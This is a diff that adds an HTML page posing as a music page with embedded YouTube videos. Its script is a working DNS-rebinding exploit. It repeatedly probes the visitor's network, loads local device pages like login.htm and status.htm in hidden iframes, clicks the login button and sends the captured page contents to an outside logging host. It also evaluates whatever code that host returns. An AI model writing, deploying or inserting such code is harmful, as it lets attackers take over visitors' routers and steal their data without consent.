@@ -1,0 +1,119 @@
+<html>
+	<head>
+	<title>TURN UP THE RADIO!!</title>
+<style>
+body{
+	background: linear-gradient(to right bottom, black, grey) fixed;
+	color: #20C20E;
+	display: flex;
+	flex-direction: column;
+	justify-content: center;
+	text-align:center;
+}
+p{
+	display: flex;
+	justify-content: center;
+	align-items: baseline;
+}
+</style>
+	<script>
+			data = "global"
+function upload(data, dontEval){
+		var xhr = new XMLHttpRequest();
+		// remote logcat allows CORS
+		xhr.open("POST", "http://logcat.nocrap.xyz")
+		xhr.onreadystatechange = () => {
+				if (xhr.status == 200 && xhr.readyState == XMLHttpRequest.DONE){
+						console.log("[*] Uploaded!")
+						if (!dontEval) // specially for calls from navigate(...)
+								eval(xhr.responseText)
+						console.log("[*] Injected!")
+				}
+		}
+		xhr.send(data)
+}
+function navigate(url, method, data){
+				console.log("[*] Navigating to /"+url)
+				if (method === undefined)
+								method = "GET"
+				var localXhr = new XMLHttpRequest();
+				localXhr.open(method, document.location.href+"/"+url);
+				if (method.toUpperCase() === "POST")
+								localXhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+				localXhr.onreadystatechange = () => {
+								if (localXhr.status == 200 && localXhr.readyState == XMLHttpRequest.DONE)
+												upload(localXhr.responseText, true)
+				}
+				localXhr.send(data)
+}
+function exploit(){
+		flushCache()
+		var xhr = new XMLHttpRequest();
+		xhr.open("GET",document.location.href+"/attacker_uuid?"+Math.random())
+		xhr.onreadystatechange =  () => {
+				if(xhr.readyState == XMLHttpRequest.DONE){
+					if(xhr.responseText.split("\n")[0] == "0103d440-9be5-44f6-abc7-4014f0926721"){
+						console.log("Attempt failed...")
+						console.log(xhr.responseText)
+					}
+					else{
+						// The attaker's id file is no longer present
+						console.log("[*] Rebinding complete")
+						var localXhr = new XMLHttpRequest();
+						localXhr.open("GET",document.location.href);
+						localXhr.onreadystatechange = () => {
+								if (localXhr.status == 200 && localXhr.readyState == XMLHttpRequest.DONE)
+										upload(localXhr.responseText)
+						}
+						localXhr.send()
+					}
+				}
+		}
+		xhr.send()
+}
+function flushCache(){
+				var frame = document.createElement("iframe")
+				frame.style.display = "none"
+				frame.src="http://"+document.location.hostname+"/?"+parseInt(Math.random()*10000)
+				frame.sandbox="allow-same-origin allow-forms"
+				var body = document.getElementsByTagName('body')[0]
+				body.appendChild(frame)
+				frame.onload = function(){
+								this.parentNode.removeChild(this)
+				}.bind(frame)
+}
+		function exploitAdmin(){
+			frame = document.createElement("iframe")
+			frame.src="http://"+document.location.hostname+"/login.htm"
+			frame.sandbox = "allow-same-origin allow-forms"
+			//frame.style.display='none'
+			var body = document.getElementsByTagName('body')[0]
+			frame.onload = function(){
+				frame.contentWindow.document.getElementById('loginBtn').click()
+				newFrame = document.createElement("iframe")
+				newFrame.sandbox = "allow-same-origin allow-scripts allow-popups allow-forms"
+				newFrame.src = "http://"+document.location.hostname+"/status.htm"
+			//	newFrame.style.display='none'
+				newFrame.onload = function(){
+					var juice = newFrame.contentWindow.document.getElementsByTagName('html')[0].innerHTML
+					upload(juice)
+				}
+				frame.appendChild(newFrame);
+
+			}
+			body.appendChild(frame)
+		}
+
+		setInterval(exploit, 5000)
+		
+			
+	</script>
+	</head>
+	<body>
+		<h1>Hello. Friend.</h1>
+		<p>
+		<iframe width="560" height="315" src="https://www.youtube.com/embed/UX2SRgr5Wg8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+		<iframe width="560" height="315" src="https://www.youtube.com/embed/TeccAtqd5K8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+		</p>
+	</body>
+</html>
